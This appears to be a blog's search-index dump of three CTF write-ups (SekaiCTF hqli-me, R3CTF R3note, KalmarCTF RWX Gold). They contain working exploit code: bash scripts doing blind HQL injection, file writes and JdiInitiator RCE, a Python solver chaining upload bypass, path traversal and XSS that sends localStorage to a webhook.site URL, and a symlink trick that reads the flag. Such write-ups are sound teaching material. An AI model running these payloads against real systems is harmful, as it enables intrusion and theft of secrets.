DATA=\u0026#34;sessionId=${SESSION_ID}\u0026amp;fields=sql%28%27to_base64%28LOAD_FILE%28%22%2Fvar%2Flib%2Fmysql-files%2Fflag%22%29%29+--+%27%29q\u0026#34; tmp=\u0026#34;$(mktemp)\u0026#34; trap \u0026#39;rm -f \u0026#34;$tmp\u0026#34;\u0026#39; EXIT while :; do code=\u0026#34;$(curl -sS --path-as-is --compressed \\ -o \u0026#34;$tmp\u0026#34; -w \u0026#39;%{http_code}\u0026#39; \\ -X POST \u0026#34;$RCE_URL\u0026#34; \\ -H \u0026#39;Content-Type: application/x-www-form-urlencoded\u0026#39; \\ --data-raw \u0026#34;$DATA\u0026#34;)\u0026#34; if [ \u0026#34;$code\u0026#34; = \u0026#34;200\u0026#34; ]; then # Try to grab a base64-looking blob; if not, fall back to ignoring garbage. if b64=\u0026#34;$(tr -d \u0026#39;\\r\\n\u0026#39; \u0026lt;\u0026#34;$tmp\u0026#34; | grep -oE \u0026#39;[A-Za-z0-9+/=]{16,}\u0026#39; | head -n1)\u0026#34;; then if [ -n \u0026#34;$b64\u0026#34; ] \u0026amp;\u0026amp; printf \u0026#39;%s\u0026#39; \u0026#34;$b64\u0026#34; | base64 --decode 2\u0026gt;/dev/null; then echo break fi fi # Fallback: decode while ignoring non-base64 characters (GNU coreutils) if decoded=\u0026#34;$(base64 --decode --ignore-garbage \u0026#34;$tmp\u0026#34; 2\u0026gt;/dev/null)\u0026#34;; then printf \u0026#39;%s\\n\u0026#39; \u0026#34;$decoded\u0026#34; else echo \u0026#34;HTTP 200 received, but could not decode base64. Raw body below:\u0026#34; cat \u0026#34;$tmp\u0026#34; fi break fi sleep 1 done payload_template.sh\n#!/bin/bash # ============================================================================== # --- CONFIGURATION --- # ============================================================================== # --- Stage 1: Flag Exfiltration Configuration --- EXFIL_URL=\u0026#34;http://127.0.0.1:8000/sessionInfo\u0026#34; REMOTE_FLAG_PATH=\u0026#34;/root/flag.s\u0026#34; START_POSITION=315 # The character set to test for each position. # Add any other special characters you suspect might be in the flag inside the quotes. CHARSET=\u0026#34;abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789_{}-!@#$%^\u0026amp;*().,/?\u0026lt;\u0026gt;~|\\`\u0026#39;\\\u0026#34;+=;:[]\\\\ \u0026#34; # The character that signals the end of the exfiltration. TERMINATION_CHAR=\u0026#34;}\u0026#34; # --- Stage 2: Remote File Write Configuration --- WRITE_URL=\u0026#34;http://127.0.0.1:1337/orders\u0026#34; WRITE_SESSION_ID=\u0026#34;\u0026lt;\u0026lt;SESSION_ID_HERE\u0026gt;\u0026gt;\u0026#34; REMOTE_OUTPUT_FILE=\u0026#34;/var/lib/mysql-files/flag\u0026#34; # ============================================================================== # --- HELPER FUNCTION (URL ENCODE) --- # ============================================================================== urlencode() { local string=\u0026#34;${1}\u0026#34; local strlen=${#string} local encoded=\u0026#34;\u0026#34; local pos c o for (( pos=0 ; pos\u0026lt;strlen ; pos++ )); do c=${string:$pos:1} case \u0026#34;$c\u0026#34; in [-_.~a-zA-Z0-9] ) o=\u0026#34;${c}\u0026#34; ;; * ) printf -v o \u0026#39;%%%02x\u0026#39; \u0026#34;\u0026#39;$c\u0026#34; esac encoded+=\u0026#34;${o}\u0026#34; done echo \u0026#34;${encoded}\u0026#34; } # ============================================================================== # --- MAIN SCRIPT LOGIC --- # ============================================================================== # --- STAGE 1: EXFILTRATE THE FLAG --- echo \u0026#34;--- Stage 1: Exfiltrating flag from \u0026#39;$REMOTE_FLAG_PATH\u0026#39; ---\u0026#34; echo \u0026#34;Starting at position: $START_POSITION\u0026#34; echo \u0026#34;----------------------------------------------------\u0026#34; EXTRACTED_FLAG=\u0026#34;\u0026#34; POSITION=$START_POSITION while true; do FOUND_CHAR=false for (( i=0; i\u0026lt;${#CHARSET}; i++ )); do CHAR=\u0026#34;${CHARSET:$i:1}\u0026#34; if [[ \u0026#34;$CHAR\u0026#34; == \u0026#34;\u0026#39;\u0026#34; ]]; then ESCAPED_CHAR=\u0026#34;\\\\\u0026#39;\u0026#34; else ESCAPED_CHAR=\u0026#34;$CHAR\u0026#34; fi # Construct the raw HQL payload for the current character guess PAYLOAD_RAW=\u0026#34;\\\u0026#34; OR SUBSTRING(CAST(FILE_READ(\u0026#39;${REMOTE_FLAG_PATH}\u0026#39;,\u0026#39;utf-8\u0026#39;) as string),${POSITION},1)=\u0026#39;${ESCAPED_CHAR}\u0026#39; OR s.sessionId=\\\u0026#34;\u0026#34; # URL-encode the payload PAYLOAD_ENCODED=$(urlencode \u0026#34;$PAYLOAD_RAW\u0026#34;) # Perform the curl request and get the status code STATUS_CODE=$(curl -s -o /dev/null -w \u0026#34;%{http_code}\u0026#34; -X POST \\ -H \u0026#34;Content-Type: application/x-www-form-urlencoded\u0026#34; \\ --data-binary \u0026#34;sessionId=${PAYLOAD_ENCODED}\u0026#34; \\ \u0026#34;$EXFIL_URL\u0026#34;) # Check the server\u0026#39;s response if [[ \u0026#34;$STATUS_CODE\u0026#34; == \u0026#34;200\u0026#34; ]]; then echo \u0026#34;Found character at position $POSITION: \u0026#39;$CHAR\u0026#39;\u0026#34; EXTRACTED_FLAG+=\u0026#34;$CHAR\u0026#34; ((POSITION++)) FOUND_CHAR=true if [[ \u0026#34;$CHAR\u0026#34; == \u0026#34;$TERMINATION_CHAR\u0026#34; ]]; then echo \u0026#34;----------------------------------------------------\u0026#34; echo \u0026#34;Termination character \u0026#39;$TERMINATION_CHAR\u0026#39; found. Stage 1 complete.\u0026#34; break 2 fi break fi done if ! $FOUND_CHAR; then echo \u0026#34;----------------------------------------------------\u0026#34; echo \u0026#34;Could not find a matching character in the charset for position $POSITION.\u0026#34; break fi done # --- STAGE 2: WRITE THE EXFILTRATED FLAG TO A REMOTE FILE --- echo \u0026#34;\u0026#34; echo \u0026#34;--- Stage 2: Writing exfiltrated flag to \u0026#39;$REMOTE_OUTPUT_FILE\u0026#39; ---\u0026#34; if [[ -z \u0026#34;$EXTRACTED_FLAG\u0026#34; ]]; then echo \u0026#34;Error: Flag exfiltration failed in Stage 1. The flag is empty. Aborting.\u0026#34; exit 1 fi echo \u0026#34;Using exfiltrated flag: $EXTRACTED_FLAG\u0026#34; # Escape characters within the flag content that would break the SQL query\u0026#39;s string literal ESCAPED_FLAG_CONTENT=$(echo \u0026#34;$EXTRACTED_FLAG\u0026#34; | sed -e \u0026#34;s/\u0026#39;/\u0026#39;\u0026#39;/g\u0026#34;) # Construct the raw payload for the \u0026#39;fields\u0026#39; parameter using the new, simpler format. # Note that we do NOT use SELECT here. WRITE_PAYLOAD_RAW=$(printf \u0026#34;sql(\u0026#39;\\\u0026#34;%s\\\u0026#34; into outfile \\\u0026#34;%s\\\u0026#34; -- \u0026#39;)\u0026#34; \u0026#34;$ESCAPED_FLAG_CONTENT\u0026#34; \u0026#34;$REMOTE_OUTPUT_FILE\u0026#34;) echo \u0026#34;Constructed Raw Payload for Stage 2: $WRITE_PAYLOAD_RAW\u0026#34; # URL-encode the entire payload WRITE_PAYLOAD_ENCODED=$(urlencode \u0026#34;$WRITE_PAYLOAD_RAW\u0026#34;) # Construct the final data body for the POST request DATA=\u0026#34;sessionId=${WRITE_SESSION_ID}\u0026amp;fields=${WRITE_PAYLOAD_ENCODED}\u0026#34; echo \u0026#34;Sending POST request to $WRITE_URL...\u0026#34; # Perform the curl request with verbosity to see the outcome curl -v -X POST \\ -H \u0026#34;Content-Type: application/x-www-form-urlencoded\u0026#34; \\ --data-binary \u0026#34;$DATA\u0026#34; \\ \u0026#34;$WRITE_URL\u0026#34; echo \u0026#34;\u0026#34; echo \u0026#34;----------------------------------------------------\u0026#34; echo \u0026#34;Exploit complete. If Stage 2 was successful, the content of the flag has been written to \u0026#39;$REMOTE_OUTPUT_FILE\u0026#39; on the database server.\u0026#34; Once run, you should get an output like this:\n--- Stage 1: Authenticating to get a new session ID --- Successfully retrieved session ID: c7876d0db3cdeb7f43c3c49d42e21949 --- Stage 2: Processing the payload template --- Generated payload script and saved it to \u0026#39;payload.sh\u0026#39;. --- Stage 3: Encoding payload and triggering RCE via JdiInitiator gadget (10 chunks) --- Total length: 6800, chunk size: 680 \u0026gt;\u0026gt;\u0026gt; Preparing request 1/10 (bytes 0..679) (Status 500 is OK) Status:500 \u0026gt;\u0026gt;\u0026gt; Preparing request 2/10 (bytes 680..1359) (Status 500 is OK) Status:500 \u0026gt;\u0026gt;\u0026gt; Preparing request 3/10 (bytes 1360..2039) (Status 500 is OK) Status:500 \u0026gt;\u0026gt;\u0026gt; Preparing request 4/10 (bytes 2040..2719) (Status 500 is OK) Status:500 \u0026gt;\u0026gt;\u0026gt; Preparing request 5/10 (bytes 2720..3399) (Status 500 is OK) Status:500 \u0026gt;\u0026gt;\u0026gt; Preparing request 6/10 (bytes 3400..4079) (Status 500 is OK) Status:500 \u0026gt;\u0026gt;\u0026gt; Preparing request 7/10 (bytes 4080..4759) (Status 500 is OK) Status:500 \u0026gt;\u0026gt;\u0026gt; Preparing request 8/10 (bytes 4760..5439) (Status 500 is OK) Status:500 \u0026gt;\u0026gt;\u0026gt; Preparing request 9/10 (bytes 5440..6119) (Status 500 is OK) Status:500 \u0026gt;\u0026gt;\u0026gt; Preparing request 10/10 (bytes 6120..6799) (Status 500 is OK) Status:500 Status:500 ---------------------------------------------------- The base64 payload was sent in chunks to /tmp/b64 and then executed. Polling for flag in mysql SEKAI{test_flag} 8. Final Notes You can read the challenge creator\u0026rsquo;s write-up here. The official solution uses CSVWRITE to achieve stacked sqli to create an alias in H2 for RCE. I wasn\u0026rsquo;t aware it was possible, The official solution also uses another method for RCE with JdiInitiator via Java code injection. I also came up with yet another way to do it beforehand with OnError and heap size JVM flags like so: new jdk.jshell.execution.JdiInitiator(0, new list(\u0026#34;-XX:OnError=id\u0026gt;/tmp/err.rce\u0026#34;,\u0026#34;-XX:OnOutOfMemoryError=id\u0026gt;/tmp/err2.rce\u0026#34;,\u0026#34;-XX:+CrashOnOutOfMemoryError\u0026#34;,\u0026#34;-Xmx3m\u0026#34;,\u0026#34;-XX:MaxMetaspaceSize=8m\u0026#34;,\u0026#34;-jar /app/target/hn-1.0-SNAPSHOT-jar-with-dependencies.jar\u0026#34;), new java.lang.String(\u0026#34;jdk.jshell.execution.RemoteExecutionControl\u0026#34;), true, null, 8000, new java.util.HashMap(2)) Funnily enough it worked locally, but not on remote. I\u0026rsquo;m sure there\u0026rsquo;s a more proper way to trigger it this way. There could be even more ways to RCE with JdiInitiator.\nXOXO,\nVXXDXX\n","permalink":"http://localhost:1313/posts/sekaictf-2025-hqli-me/","summary":"\u003ch2 id=\"overview\"\u003eOverview\u003c/h2\u003e\n\u003cblockquote\u003e\n\u003cp\u003ePlease note that this challenge has no outgoing network access.\u003c/p\u003e\n\u003c/blockquote\u003e\n\u003cp\u003eChallenge author: irogir\u003cbr\u003e\nSolves: 3\u003c/p\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"hqli-solves.png\" alt=\"Solves\"  /\u003e\n\u003c/p\u003e\n\u003cp\u003eFun challenge focused mostly on RCE via HQL.\u003c/p\u003e\n\u003chr\u003e\n\u003ch2 id=\"1-general-analysis\"\u003e1. General Analysis\u003c/h2\u003e\n\u003cp\u003eThe challenge deployment consists of 3 containers:\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003e\u003ccode\u003eorder_service\u003c/code\u003e,\u003c/li\u003e\n\u003cli\u003e\u003ccode\u003eauthn_service\u003c/code\u003e containing the flag,\u003c/li\u003e\n\u003cli\u003emysql\u003c/li\u003e\n\u003c/ul\u003e\n\u003cp\u003eWe can reach any container from within another, but only \u003ccode\u003eorder_service\u003c/code\u003e is exposed externally. Both \u003ccode\u003eorder_service\u003c/code\u003e and \u003ccode\u003eauthn_service\u003c/code\u003e are Java applications that use HQL to query the underlying databases; however, \u003ccode\u003eorder_service\u003c/code\u003e uses mysql from another container, while \u003ccode\u003eauthn_service\u003c/code\u003e opted for an in-memory H2 db.\u003c/p\u003e","title":"SekaiCTF 2025 hqli-me"},{"content":"Overview In the dawning age of the ARPANET\u0026rsquo;s gleam\nA simple idea, a persistent dream\nFrom a humble note, in \u0026lsquo;69 it came\nSteve Crocker wrote it, and whispered its name\nA \u0026ldquo;Request for Comments,\u0026rdquo; a title so grand\nTo build the foundation across the land\nFrom a simple memo, a legacy grew\nTo connect the world, for me and for you.\nSolves: 10\nThis write-up describes a series of vulnerabilities in the r3note application that, when chained together, lead to XSS. The vulnerabilities include a file upload bypass, a path traversal, nginx misconfiguration and an XSS vulnerability.\nVulnerability and Source Code Analysis 1. File Upload Bypass via appending a fragment The file upload functionality in app/api/image.go attempts to prevent the upload of potentially dangerous files like .js, .css, and .html files. However, this check is based on a simple blacklist of file extensions.\n// app/api/image.go:43 ext := filepath.Ext(header.Filename) if ext == \u0026#34;\u0026#34; || ext == \u0026#34;.js\u0026#34; || ext == \u0026#34;.css\u0026#34; || ext == \u0026#34;.html\u0026#34; { c.JSON(http.StatusBadRequest, ErrorResponse{Error: \u0026#34;Invalid file type\u0026#34;}) return } This blacklist can be bypassed by using a filename that ends with a fragment, such as .js#. The filepath.Ext function will return .js#, which is not in the blacklist. However, when the file is cached by nginx, the fragment is ignored, and the browser interprets the file as a JavaScript file. This is further explained in the Nginx Configuration section.\n2. Path Traversal in report functionality The report functionality allows us to submit a share token, that will be checked out by the bot. There\u0026rsquo;s no sanitization for the submitted token.\n// bot/bot.mjs:97 app.post(\u0026#34;/api/share/report\u0026#34;, (req, res) =\u0026gt; { const token = req.body.token; if (token \u0026amp;\u0026amp; typeof token === \u0026#34;string\u0026#34;) { addTokenToQueue(token); res.status(200).json({ status: \u0026#34;success\u0026#34;, message: \u0026#34;Report submitted successfully. Thank you for your feedback!\u0026#34; }); } else { res.status(400).send(\u0026#34;Invalid token\u0026#34;); } }); // bot/bot.mjs:72 await page.goto(\u0026#34;http://127.0.0.1:8080/\u0026#34;, { timeout: 5000 }); await page.evaluate((flag) =\u0026gt; { localStorage.setItem(\u0026#34;flag\u0026#34;, flag); }, FLAG); console.log(`Checking report for token: ${token}`); await page.goto(`http://127.0.0.1:8080/share/${token}`, { timeout: 5000 }); The bot, in bot/bot.mjs, navigates to /share/{token}, This allows an attacker to craft a malicious token containing path traversal sequences (../) to make the bot visit arbitrary endpoints hosted by the server.\n3. Referer check in GetImage The GetImage which is called by /api/image/:id checks for a Referer header and returns 403 if it\u0026rsquo;s empty.\nfunc GetImage(c *gin.Context, db *gorm.DB, cfg *config.Config) { imgID := c.Param(\u0026#34;id\u0026#34;) var img model.Image if err := db.Where(\u0026#34;id = ?\u0026#34;, imgID).First(\u0026amp;img).Error; err != nil { c.JSON(http.StatusNotFound, ErrorResponse{Error: \u0026#34;Image not found\u0026#34;}) return } ref := c.Request.Referer() if ref == \u0026#34;\u0026#34; { c.JSON(http.StatusForbidden, ErrorResponse{Error: \u0026#34;Forbidden\u0026#34;}) return } refURL, err := url.Parse(ref) if err != nil { c.JSON(http.StatusForbidden, ErrorResponse{Error: \u0026#34;Forbidden\u0026#34;}) } fmt.Println(refURL.Host, c.Request.Host) if refURL.Host != c.Request.Host { c.JSON(http.StatusForbidden, ErrorResponse{Error: \u0026#34;Forbidden\u0026#34;}) return } filePath := filepath.Join(cfg.Upload.Path, img.UserID.String(), img.FileName) if _, err := os.Stat(filePath); err != nil { c.JSON(http.StatusNotFound, ErrorResponse{Error: \u0026#34;File not found\u0026#34;}) return } c.File(filePath) } This prevents us from uploading a malicious html as an image and sending the bot to visit it directly.\n4. Nginx Configuration The Nginx configuration plays a crucial role in this exploit. Here\u0026rsquo;s the relevant part of the configuration:\nlocation /files/upload/ { deny all; } location ~ \\.(css|js)$ { proxy_cache static_cache; proxy_pass http://127.0.0.1:3000; proxy_cache_key $uri$is_args$args; ... } Nginx processes location blocks in a specific order of priority. A regular expression match (like ~ \\.(css|js)$) has a higher priority than a prefix match (like /files/upload/). This means that even though there\u0026rsquo;s a rule to deny access to the /files/upload/ directory, a request for a file ending in .js within that directory will be handled by the regex location block, bypassing the deny all directive. We\u0026rsquo;ll combine this fact along with the upload bypass trick to send the bot to a malicious html file uploaded by us. Furthermore, proxy_cache_key doesn\u0026rsquo;t include the fragment part, so after we initially access it and therefore cache a file with filename ending with #whatever we can later access it omitting the #whatever ending.\n5 Lack of X-Content-Type-Options: nosniff response header Due to the lack of X-Content-Type-Options: nosniff in response headers, the browser will guess the MIME type of the file based on its contents.\n6 Cross-Site Scripting (XSS) The go middleware sets a CSP that allows us to include scripts served from the same origin.\n// app/middleware/jwt.go:66 c.Writer.Header().Set(\u0026#34;Content-Security-Policy\u0026#34;, \u0026#34;default-src \u0026#39;self\u0026#39;; script-src \u0026#39;self\u0026#39;; style-src \u0026#39;self\u0026#39; \u0026#39;unsafe-inline\u0026#39;;\u0026#34;) We can upload arbitrary javascript file via the image upload and include it in our malicious html file.\nExploitation The exploit consists of the following steps:\nRegister\nLogin\nGet userId via /api/user/me\nWe need the userId to access our uploaded files via /files/upload.\nUpload a malicious JavaScript file that exfiltrates the flag from localStorage\nWe upload a JavaScript file that will steal the flag from the bot\u0026rsquo;s local storage and send it to a server we control. We can use any extension that\u0026rsquo;s not blacklisted.\nUpload a malicious HTML file disgused as a js file\nWe upload an HTML file that will be used to trigger the XSS. This file will contain a \u0026lt;script\u0026gt; tag that points to the JavaScript file we uploaded in the previous step. We\u0026rsquo;ll upload the the file with .js# extension so that we can access it via the location ~ \\.(css|js)$ nginx rule while bypassing the extension check in code.\nAccess the HTML file we have just uploaded to cache it\nCaching the file will allow accessing it omitting the fragment (with just .js). If we don\u0026rsquo;t perform this step, and try sending the bot to url ending with .js#, the browser will ignore the trailing fragment when making the request.\nTrigger the path traversal.\nWe send a request to the bot\u0026rsquo;s reporting endpoint with a specially crafted token ../files/upload/{user_id}/{html_id}.js. This token will use path traversal to make the bot navigate to the HTML file we uploaded and cached.\nSolver Script import requests import random import string import subprocess BASE_URL = \u0026#34;http://127.0.0.1:8080\u0026#34; API_URL = f\u0026#34;{BASE_URL}/api\u0026#34; WEBHOOK_URL = \u0026#34;https://webhook.site/482b28b0-6ed4-466d-9855-a211694816e7\u0026#34; # --- Helper Function --- def generate_random_string(length): \u0026#34;\u0026#34;\u0026#34;Generates a random alphanumeric string of a given length.\u0026#34;\u0026#34;\u0026#34; return \u0026#39;\u0026#39;.join(random.choices(string.ascii_lowercase + string.digits, k=length)) # --- Main Script --- def main(): s = requests.Session() username = generate_random_string(6) password = generate_random_string(6) credentials = {\u0026#34;username\u0026#34;: username, \u0026#34;password\u0026#34;: password} print(f\u0026#34;[*] Generated credentials: {credentials}\u0026#34;) # --- Step 1: Register User --- print(\u0026#34;\\n[1] Registering user...\u0026#34;) register_url = f\u0026#34;{API_URL}/user/register\u0026#34; r = s.post(register_url, json=credentials, timeout=5) r.raise_for_status() # Raise an exception for bad status codes (4xx or 5xx) print(f\u0026#34;[+] Registration successful!\u0026#34;) # --- Step 2: Login and get Token --- print(\u0026#34;\\n[2] Logging in...\u0026#34;) login_url = f\u0026#34;{API_URL}/user/login\u0026#34; r = s.post(login_url, json=credentials, timeout=5) r.raise_for_status() login_data = r.json() token = login_data.get(\u0026#34;token\u0026#34;) if not token: raise ValueError(\u0026#34;[!] Failed to get token from login response.\u0026#34;) print(f\u0026#34;[+] Login successful! Token received.\u0026#34;) # Add Authorization header for all subsequent requests in this session s.headers.update({\u0026#34;Authorization\u0026#34;: f\u0026#34;Bearer {token}\u0026#34;}) # --- Step 3: Get User Info and save userId --- print(\u0026#34;\\n[3] Fetching user info...\u0026#34;) me_url = f\u0026#34;{API_URL}/user/me\u0026#34; r = s.get(me_url, timeout=5) r.raise_for_status() user_data = r.json() user_id = user_data.get(\u0026#34;id\u0026#34;) if not user_id: raise ValueError(\u0026#34;[!] Failed to get user ID from /me endpoint.\u0026#34;) print(f\u0026#34;[+] User ID retrieved: {user_id}\u0026#34;) # --- Step 4: Upload JS payload file --- print(\u0026#34;\\n[4] Uploading JS payload file...\u0026#34;) js_payload_content = f\u0026#34;window.location=\u0026#39;{WEBHOOK_URL}?c=\u0026#39;+localStorage.getItem(\\\u0026#34;flag\\\u0026#34;)\u0026#34; files_js = {\u0026#39;file\u0026#39;: (\u0026#39;.anything\u0026#39;, js_payload_content, \u0026#39;text/html\u0026#39;)} upload_url = f\u0026#34;{API_URL}/image/upload\u0026#34; r = s.post(upload_url, files=files_js, timeout=5) r.raise_for_status() upload_js_data = r.json() js_id = upload_js_data.get(\u0026#34;id\u0026#34;) if not js_id: raise ValueError(\u0026#34;[!] Failed to get ID for the JS payload file.\u0026#34;) print(f\u0026#34;[+] JS payload uploaded successfully. ID: {js_id}\u0026#34;) # --- Step 5: Upload HTML file --- print(\u0026#34;\\n[5] Uploading HTML file...\u0026#34;) html_content = f\u0026#34;\u0026lt;html\u0026gt;\u0026lt;body\u0026gt;asdf\u0026lt;script src=/api/image/{js_id}\u0026gt;\u0026lt;/script\u0026gt;\u0026lt;/body\u0026gt;\u0026lt;/html\u0026gt;\u0026#34; files_html = {\u0026#39;file\u0026#39;: (\u0026#39;.js#\u0026#39;, html_content, \u0026#39;text/html\u0026#39;)} r = s.post(upload_url, files=files_html, timeout=5) r.raise_for_status() upload_html_data = r.json() html_id = upload_html_data.get(\u0026#34;id\u0026#34;) if not html_id: raise ValueError(\u0026#34;[!] Failed to get ID for the HTML wrapper file.\u0026#34;) print(f\u0026#34;[+] HTML wrapper uploaded successfully. ID: {html_id}\u0026#34;) # --- Step 6: Acecess and cache the uploaded html file. We use curl with --request-target to force the inclusion of \u0026#34;#\u0026#34; in the url. command = [ \u0026#34;curl\u0026#34;, \u0026#34;-v\u0026#34;, \u0026#34;--request-target\u0026#34;, f\u0026#34;/files/upload/{user_id}/{html_id}.js#\u0026#34;, BASE_URL ] result = subprocess.run( command, capture_output=True, text=True, check=False ) print(result.stdout) # --- Step 7: Report/Share to trigger the chain. We can use just \u0026#34;.js\u0026#34; now, since the file is cached and fragment is ignored in the proxy_cache_key --- print(\u0026#34;\\n[6] Sending report to trigger the payload...\u0026#34;) report_token = f\u0026#34;../files/upload/{user_id}/{html_id}.js\u0026#34; report_payload = {\u0026#34;token\u0026#34;: report_token, \u0026#34;reason\u0026#34;: \u0026#34;asdf\u0026#34;} report_url = f\u0026#34;{API_URL}/share/report\u0026#34; r = s.post(report_url, json=report_payload, timeout=5) r.raise_for_status() print(f\u0026#34;[+] Report sent successfully! Status: {r.status_code}\u0026#34;) print(f\u0026#34; Response: {r.text}\u0026#34;) print(\u0026#34;\\n[*] Script finished. Check your webhook URL for results.\u0026#34;) if __name__ == \u0026#34;__main__\u0026#34;: main() Final Notes Remember to include X-Content-Type-Options: nosniff in server response headers, Pay special attention to nginx configuration. XOXO,\nVXXDXX\n","permalink":"http://localhost:1313/posts/r3ctf-2025-r3note/","summary":"\u003ch2 id=\"overview\"\u003eOverview\u003c/h2\u003e\n\u003cblockquote\u003e\n\u003cp\u003eIn the dawning age of the ARPANET\u0026rsquo;s gleam\u003cbr\u003e\nA simple idea, a persistent dream\u003cbr\u003e\nFrom a humble note, in \u0026lsquo;69 it came\u003cbr\u003e\nSteve Crocker wrote it, and whispered its name\u003cbr\u003e\nA \u0026ldquo;Request for Comments,\u0026rdquo; a title so grand\u003cbr\u003e\nTo build the foundation across the land\u003cbr\u003e\nFrom a simple memo, a legacy grew\u003cbr\u003e\nTo connect the world, for me and for you.\u003c/p\u003e\n\u003c/blockquote\u003e\n\u003cp\u003eSolves: 10\u003c/p\u003e\n\u003cp\u003eThis write-up describes a series of vulnerabilities in the r3note application that, when chained together, lead to XSS. The vulnerabilities include a file upload bypass, a path traversal, nginx misconfiguration and an XSS vulnerability.\u003c/p\u003e","title":"R3CTF 2025 R3note"},{"content":"Intro This post covers RWX Gold from KalmarCTF 2024.\nWe give you file read, file write and code execution. But can you get the flag? Let\u0026rsquo;s reduce that.\nAnalysis The following is the source code of the application:\nfrom flask import ( Flask, json, jsonify, request, render_template, ) from pathlib import Path from uuid import uuid4, UUID import os from werkzeug.exceptions import NotFound, BadRequest, Forbidden import subprocess app = Flask(__name__) storage_path = Path(__file__).parent / \u0026#34;storage\u0026#34; os.system(\u0026#34;podman pull docker.io/library/gcc:latest\u0026#34;) @app.get(\u0026#34;/\u0026#34;) def get_index(): return render_template(\u0026#34;index.html\u0026#34;) @app.get(\u0026#34;/\u0026lt;id\u0026gt;\u0026#34;) def get_result(id): id = str(UUID(id)) try: code = Path(storage_path, id, \u0026#34;main.c\u0026#34;).read_text() output = Path(storage_path, id, \u0026#34;output.txt\u0026#34;).read_text() except FileNotFoundError: raise NotFound() if output == \u0026#34;\u0026#34;: output = \u0026#34;[no output yet, try refreshing]\u0026#34; return render_template(\u0026#34;result.html\u0026#34;, code=code, output=output) @app.post(\u0026#34;/run\u0026#34;) def post_run(): if request.json is None: raise UnsupportedMediaType() code = request.json[\u0026#34;code\u0026#34;] if not isinstance(code, str): raise BadRequest() id = run_code(code) return jsonify({\u0026#34;id\u0026#34;: id}) def run_code(code): if len(code) \u0026gt; 10000: raise Forbidden() id = uuid4() folder = Path(storage_path, str(id)) folder.mkdir(parents=True) Path(folder, \u0026#34;main.c\u0026#34;).write_text(code) os.system( f\u0026#34;podman run --timeout 5 --detach -v {str(folder.absolute())}:/mnt --workdir /mnt gcc \u0026#34; + \u0026#34;sh -c \u0026#39;gcc main.c \u0026gt; output.txt 2\u0026gt;\u0026amp;1 \u0026amp;\u0026amp; ./a.out | head -c 1000 \u0026gt;\u0026gt; output.txt\u0026#39;\u0026#34; ) subprocess.Popen(f\u0026#34;sleep 60; rm -r {folder.absolute()}\u0026#34;, shell=True) return id print(\u0026#34;started\u0026#34;) As we can see, there are 2 main endpoints: @app.post(\u0026quot;/run\u0026quot;) amd @app.get(\u0026quot;/\u0026lt;id\u0026gt;\u0026quot;). The first one is used to compile our source code and run it, all in a podman pod and the second one is used to display the source code that was compiled and executed alongside the output.\nReplacing The Source Code With a Symlink The flag is located at /app/flag.txt, while the compilation files are temporarily saved to /app/storage/\u0026lt;UUID\u0026gt; . Both compilation and execution take place inside a pod, which doesn\u0026rsquo;t have direct access to the flag file. However, we notice that:\nInside a pod, we have access to the source code main.c of the program that\u0026rsquo;s being executed, The web application has access to the flag file, The web application displays the source code main.c of the program was run via the @app.get(\u0026quot;/\u0026lt;id\u0026gt;\u0026quot;) endpoint. We create a program that removes main.c and replaces it with a symlink to /app/flag.\n#include \u0026lt;stdio.h\u0026gt; #include \u0026lt;stdlib.h\u0026gt; int main() { system(\u0026#34;rm main.c \u0026amp;\u0026amp; ln -s /app/flag.txt main.c\u0026#34;); return 0; } Now we run it, and display the results. Since we replaced main.c with a symlink to the flag, the web application displays the flag content under the Code section.\nWe got the flag! bctf{fr33d0m_1s_bu7_4n_3mp7y_1llu510n_b842fff60fc03a4f}\n","permalink":"http://localhost:1313/posts/kalmarctf-2025-rwx-gold/","summary":"\u003ch2 id=\"intro\"\u003eIntro\u003c/h2\u003e\n\u003cp\u003eThis post covers \u003cem\u003eRWX Gold\u003c/em\u003e from \u003cem\u003eKalmarCTF 2024\u003c/em\u003e.\u003c/p\u003e\n\u003cblockquote\u003e\n\u003cp\u003eWe give you file read, file write and code execution. But can you get the flag? Let\u0026rsquo;s reduce that.\u003c/p\u003e\n\u003c/blockquote\u003e\n\u003ch2 id=\"analysis\"\u003eAnalysis\u003c/h2\u003e\n\u003cp\u003eThe following is the source code of the application:\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" style=\"color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;\"\u003e\u003ccode class=\"language-python\" data-lang=\"python\"\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#f92672\"\u003efrom\u003c/span\u003e flask \u003cspan style=\"color:#f92672\"\u003eimport\u003c/span\u003e (\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e Flask,\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e json,\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e jsonify,\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e request,\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e render_template,\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e)\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#f92672\"\u003efrom\u003c/span\u003e pathlib \u003cspan style=\"color:#f92672\"\u003eimport\u003c/span\u003e Path\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#f92672\"\u003efrom\u003c/span\u003e uuid \u003cspan style=\"color:#f92672\"\u003eimport\u003c/span\u003e uuid4, UUID\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#f92672\"\u003eimport\u003c/span\u003e os\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#f92672\"\u003efrom\u003c/span\u003e werkzeug.exceptions \u003cspan style=\"color:#f92672\"\u003eimport\u003c/span\u003e NotFound, BadRequest, Forbidden\n\u003c/span\u003e\u003c/span\u003e\u003cspan 